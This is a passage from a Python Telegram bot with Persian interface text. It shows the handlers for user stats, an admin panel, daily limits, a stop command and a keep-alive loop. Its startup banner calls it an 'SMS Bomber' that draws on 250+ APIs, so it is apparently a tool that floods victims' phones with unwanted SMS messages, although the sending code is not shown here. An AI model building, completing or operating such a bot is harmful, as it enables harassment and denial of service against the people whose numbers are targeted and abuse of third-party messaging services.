        f"• زمان تقریبی: 2-3 دقیقه\n\n"
        "⚠️ **هشدار:** استفاده مسئولانه"
    )
    bot.send_message(message.chat.id, text, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "📊 آمار من")
def my_stats(message):
    user_id = message.from_user.id
    daily = get_daily_count(user_id)
    remaining = DAILY_LIMIT - daily
    result = db.get_user_total(user_id)
    total = result[0] if result else 0
    join_date = result[1] if result else "نامشخص"
    
    status = "👑 ادمین" if is_admin(user_id) else "👤 کاربر عادی"
    
    text = (
        f"📊 **آمار شما**\n\n"
        f"🆔 **آیدی:** `{user_id}`\n"
        f"👤 **نوع:** {status}\n"
        f"📅 **عضویت:** {join_date}\n"
        f"📊 **امروز:** {daily}/{DAILY_LIMIT}\n"
        f"✅ **باقیمانده:** {remaining}\n"
        f"🔰 **کل:** {total}"
    )
    
    bot.send_message(message.chat.id, text, parse_mode="Markdown")

@bot.message_handler(func=lambda m: m.text == "👑 پنل مدیریت")
def admin_panel(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "⛔ دسترسی غیرمجاز!")
        return
    
    total_users, today_users, total_requests, weekly = db.get_stats()
    
    text = (
        "👑 **پنل مدیریت**\n\n"
        f"📊 **آمار کلی:**\n"
        f"👥 **کل کاربران:** {total_users}\n"
        f"📅 **کاربران امروز:** {today_users}\n"
        f"🔰 **کل درخواست:** {total_requests}\n\n"
        f"📈 **آمار هفتگی:**\n"
    )
    
    for w in weekly:
        text += f"  • {w[0]}: {w[1]} درخواست\n"
    
    # دکمه‌های مدیریتی
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("🔄 ریستارت", callback_data="admin_restart"),
        InlineKeyboardButton("📋 لاگ", callback_data="admin_logs")
    )
    
    bot.send_message(message.chat.id, text, parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
def admin_callbacks(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "⛔ دسترسی غیرمجاز!")
        return
    
    if call.data == "admin_restart":
        bot.answer_callback_query(call.id, "✅ بات ریستارت شد!")
    
    elif call.data == "admin_logs":
        bot.answer_callback_query(call.id, "📋 لاگ‌ها در کنسول قابل مشاهده است")

@bot.message_handler(commands=['stop'])
def stop_process(message):
    chat_id = message.chat.id
    if chat_id in user_processes:
        user_processes[chat_id] = False
        bot.send_message(chat_id, "⛔ فرآیند متوقف شد.")
    else:
        bot.send_message(chat_id, "⚠️ هیچ فرآیند فعالی وجود ندارد.")

@bot.message_handler(func=lambda m: True)
def default_handler(message):
    bot.reply_to(message, "❌ دستور نامعتبر. از دکمه‌های منو استفاده کنید.")

# ==================== اجرا ====================

if __name__ == "__main__":
    print("="*60)
    print("🤖 ربات SMS Bomber - نسخه نهایی")
    print("="*60)
    print(f"✅ دیتابیس: درون حافظه (نیاز به فایل ندارد)")
    print(f"✅ کانال: {REQUIRED_CHANNEL}")
    print(f"✅ محدودیت: {DAILY_LIMIT} بار در روز")
    print(f"✅ ادمین‌ها: {len(ADMIN_IDS)} نفر")
    print(f"✅ شماره محافظت شده: {len(PROTECTED_PHONE_HASHES)} عدد")
    print(f"✅ APIها: 250+ (کامل)")
    print("="*60)
    
    # شروع ترد جلوگیری از خواب
    keep_alive_thread = threading.Thread(target=keep_alive, daemon=True)
    keep_alive_thread.start()
    print("✅ ترد زنده نگه داشتن فعال شد")
    
    # اجرای بات
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"❌ خطا در اجرای بات: {e}")
            print("🔄 تلاش مجدد در 5 ثانیه...")
            time.sleep(5)
